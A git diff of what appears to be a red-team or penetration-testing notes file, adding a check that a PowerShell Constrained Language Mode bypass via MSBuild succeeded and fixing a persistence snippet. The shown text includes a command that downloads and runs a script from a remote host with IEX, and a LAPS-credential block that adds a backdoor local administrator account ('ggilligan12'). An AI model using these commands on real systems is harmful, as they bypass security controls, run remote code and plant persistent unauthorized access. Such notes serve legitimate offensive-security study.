@@ -214,6 +214,10 @@ Having copied the `.csproj` to an appropriate writable dir, eg. `C:\Windows\Task
 ```powershell
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe .\FullBypass.csproj
 ```
+To check our CLM bypass has succeeded:
+```powershell
+$ExecutionContext.SessionState.LanguageMode
+```
 
 ### AMSI Bypass
 
@@ -281,8 +285,8 @@ IEX ((New-Object System.Net.WebClient).DownloadString('http://192.168.x.y/LAPSTo
 
 To leverage this to persist access:
 ```powershell
-$username = "$hostname\Administrator"
+$username = "$(hostname)\Administrator"
 $password = ConvertTo-SecureString "YourLAPSAdminPassword" -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential($username, $password)
-Invoke-Command -ComputerName $hostname -Credential $credential -ScriptBlock { net user ggilligan12 password123! /add; net localgroup administrators ggilligan12 /add}
+Invoke-Command -ComputerName "$(hostname)" -Credential $credential -ScriptBlock { net user ggilligan12 password123! /add; net localgroup administrators ggilligan12 /add}
 ```
